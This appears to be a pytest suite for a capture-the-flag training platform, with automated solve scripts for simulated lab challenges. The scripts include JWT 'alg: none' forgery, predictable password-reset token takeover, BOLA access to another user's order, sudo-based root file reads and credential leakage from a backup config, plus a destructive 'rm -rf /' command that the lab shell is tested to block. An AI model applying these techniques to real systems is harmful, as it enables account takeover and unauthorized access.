"""End-to-end solve tests for the second wave of seed challenges. Each performs
the intended exploit against the live lab, captures the per-session flag, submits
it, and asserts the award — same contract as test_challenges.py.
"""
from __future__ import annotations

import base64
import io
import json
import pytest
import re

from conftest import auth_headers, register, start_lab, submit_flag

FLAG_RE = re.compile(r"MYCTF\{[^}]+\}")


def _lab(iid, sub=""):
    return f"/labs/{iid}/{sub}"


def _find(text):
    m = FLAG_RE.search(text)
    assert m, f"no flag in:\n{text[:400]}"
    return m.group(0)


def _solve(client, token, slug, flag, pts):
    r = submit_flag(client, token, slug, flag)
    body = r.get_json()
    assert r.status_code == 200 and body["correct"] and body["awarded"] == pts, body
    assert submit_flag(client, token, slug, flag).get_json()["already_solved"] is True


@pytest.mark.parametrize("slug", ["stored-xss", "insecure-file-upload", "ewpt-vendor-osint", "ewpt-tomcat-weak-creds", "ewpt-xrdp-exposure"])
def test_removed_challenges_are_hidden_and_not_startable(client, user, slug):
    """Notice Board, New Look, Public Record, Operations Center and Workstation were withdrawn."""
    t = user["token"]
    names = {c["name"] for c in client.get("/api/challenges", headers=auth_headers(t)).get_json()}
    assert not names & {"Notice Board", "New Look", "Public Record", "Operations Center", "Workstation"}
    r = client.post(f"/api/challenges/{slug}/lab/start", headers=auth_headers(t))
    assert r.status_code == 404


def test_weak_password_reset(client, user):
    t = user["token"]
    iid = start_lab(client, t, "weak-password-reset")
    r = client.post(_lab(iid, "forgot"), headers=auth_headers(t), data={"user": "guest"})
    g = int(re.search(r"token:\s*(\d+)", r.get_data(as_text=True)).group(1))
    client.post(_lab(iid, "forgot"), headers=auth_headers(t), data={"user": "victim"})
    r = client.post(_lab(iid, "reset"), headers=auth_headers(t),
                    data={"user": "victim", "token": str(g + 1), "new_password": "x!23456789"})
    _solve(client, t, "weak-password-reset", _find(r.get_data(as_text=True)), 200)


def test_jwt_alg_none(client, user):
    t = user["token"]
    iid = start_lab(client, t, "jwt-authorization-flaw")

    def b64u(d):
        return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()
    forged = b64u({"alg": "none", "typ": "JWT"}) + "." + b64u({"user": "x", "role": "admin"}) + "."
    r = client.get(_lab(iid, "admin"), headers=auth_headers(t), query_string={"token": forged})
    _solve(client, t, "jwt-authorization-flaw", _find(r.get_data(as_text=True)), 200)


def test_api_bola(client, user):
    t = user["token"]
    iid = start_lab(client, t, "api-bola")
    r = client.get(_lab(iid, "api/orders/5002"),
                   headers={**auth_headers(t), "X-API-Key": "sk_live_guest_9f2a"})
    assert r.status_code == 200
    _solve(client, t, "api-bola", _find(r.get_data(as_text=True)), 200)


def test_api_bola_requires_key(client, user):
    t = user["token"]
    iid = start_lab(client, t, "api-bola")
    r = client.get(_lab(iid, "api/orders/5002"), headers=auth_headers(t))
    assert r.status_code == 401


def test_pcap_investigation(client, user):
    t = user["token"]
    iid = start_lab(client, t, "pcap-investigation")
    page = client.get(_lab(iid), headers=auth_headers(t)).get_data(as_text=True)
    enc = re.search(r"recovery=([A-Za-z0-9+/=]+)", page).group(1)
    flag = base64.b64decode(enc).decode()
    assert FLAG_RE.fullmatch(flag), flag
    _solve(client, t, "pcap-investigation", flag, 100)


def test_linux_basics(client, user):
    t = user["token"]
    iid = start_lab(client, t, "linux-basics")
    # hidden dir visible only with ls -a
    ls = client.get(_lab(iid, "exec"), headers=auth_headers(t),
                    query_string={"cmd": "ls -a"}).get_json()
    assert ".secret" in ls["output"]
    out = client.get(_lab(iid, "exec"), headers=auth_headers(t),
                     query_string={"cmd": "cat .secret/flag.txt"}).get_json()
    _solve(client, t, "linux-basics", _find(out["output"]), 50)


def test_linux_privesc(client, user):
    t = user["token"]
    iid = start_lab(client, t, "linux-privesc")
    # direct read is denied
    denied = client.get(_lab(iid, "exec"), headers=auth_headers(t),
                        query_string={"cmd": "cat /root/flag.txt"}).get_json()
    assert "Permission denied" in denied["output"]
    # sudo misconfig allows it
    out = client.get(_lab(iid, "exec"), headers=auth_headers(t),
                     query_string={"cmd": "sudo cat /root/flag.txt"}).get_json()
    _solve(client, t, "linux-privesc", _find(out["output"]), 200)


# ------------------------------------------------------- terminal (shell) labs
def _sh(client, t, iid, command):
    r = client.post(_lab(iid, "shell"), headers=auth_headers(t), json={"command": command})
    assert r.status_code == 200, r.get_data(as_text=True)
    return r.get_json()


def test_shell_session_and_streams(client, user):
    t = user["token"]
    iid = start_lab(client, t, "linux-basics")
    info = client.get(_lab(iid, "shell"), headers=auth_headers(t)).get_json()
    assert (info["user"], info["host"], info["cwd"]) == ("ctf", "lab", "/home/ctf")
    ok = _sh(client, t, iid, "ls")
    assert "README.txt" in ok["stdout"] and ok["stderr"] == ""
    bad = _sh(client, t, iid, "cat nope.txt")
    assert bad["stdout"] == "" and "No such file" in bad["stderr"]
    assert "command not found" in _sh(client, t, iid, "rm -rf /")["stderr"]
    assert _sh(client, t, iid, "cd .secret")["cwd"] == "/home/ctf/.secret"
    assert _sh(client, t, iid, "pwd")["stdout"] == "/home/ctf/.secret"
    assert _sh(client, t, iid, "cd ~")["cwd"] == "/home/ctf"
    piped = _sh(client, t, iid, "cat README.txt notes.txt | grep -i secret")
    assert piped["stdout"] == "TODO: tidy up. Nothing secret here."
    assert "single commands" in _sh(client, t, iid, "ls; id")["stderr"]
    assert "unterminated" in _sh(client, t, iid, "echo 'oops")["stderr"]
    assert "too long" in _sh(client, t, iid, "echo " + "A" * 600)["stderr"]


def test_shell_flag_listed_in_api(client, user):
    t = user["token"]
    rows = client.get("/api/challenges", headers=auth_headers(t)).get_json()
    for original, expected in [("shell-web-recon", True), ("linux-basics", True), ("sqli-login-bypass", False)]:
        detail = client.get("/api/challenges/" + original, headers=auth_headers(t)).get_json()
        row = next(c for c in rows if c["id"] == detail["id"])
        assert row["is_shell"] is expected
        assert row["slug"].startswith("case-")



def test_shell_web_recon(client, user):
    t = user["token"]
    iid = start_lab(client, t, "shell-web-recon")
    assert "Disallow: /backup/" in _sh(client, t, iid, "curl http://10.10.10.5/robots.txt")["stdout"]
    assert "401" in _sh(client, t, iid, "curl -i http://10.10.10.5/admin/")["stdout"]
    assert "Could not resolve" in _sh(client, t, iid, "curl http://example.com/")["stderr"]
    cfg = _sh(client, t, iid, "curl -s http://10.10.10.5/backup/config.php.bak | grep admin_pass")["stdout"]
    password = re.search(r'"([^"]+)"', cfg).group(1)
    wrong = _sh(client, t, iid, "curl -u admin:wrong http://10.10.10.5/admin/")["stdout"]
    assert "MYCTF{" not in wrong
    out = _sh(client, t, iid, f"curl -u 'admin:{password}' http://10.10.10.5/admin/")["stdout"]
    _solve(client, t, "shell-web-recon", _find(out), 100)


def test_shell_pcap_forensics(client, user):
    t = user["token"]
    iid = start_lab(client, t, "shell-pcap-forensics")
    assert "no capture file" in _sh(client, t, iid, "tshark")["stderr"]
    assert "command not found" in _sh(client, t, iid, "decode.py a b")["stderr"]
    ftp = _sh(client, t, iid, "tshark -r evidence/capture.pcap -Y ftp")["stdout"]
    key = re.search(r"PASS (\S+)", ftp).group(1)
    http = _sh(client, t, iid, "tshark -r evidence/capture.pcap -Y http")["stdout"]
    data = re.search(r"data=(\S+)", http).group(1)
    assert "MYCTF{" not in http and "DNS" not in http
    assert "usage" in _sh(client, t, iid, "./decode.py")["stderr"]
    assert "MYCTF{" not in _sh(client, t, iid, f"./decode.py {data} wrongkey")["stdout"]
    out = _sh(client, t, iid, f"python3 decode.py {data} {key}")["stdout"]
    _solve(client, t, "shell-pcap-forensics", _find(out), 200)
    # the capture's readable strings never contain the plain flag either
    assert "MYCTF{" not in _sh(client, t, iid, "strings evidence/capture.pcap")["stdout"]


def test_shell_is_private_to_owner(client, user):
    t = user["token"]
    iid = start_lab(client, t, "linux-basics")
    other = client.application.test_client()
    _, t2 = register(other)
    r = other.post(_lab(iid, "shell"), headers=auth_headers(t2), json={"command": "ls -a"})
    assert r.status_code == 403
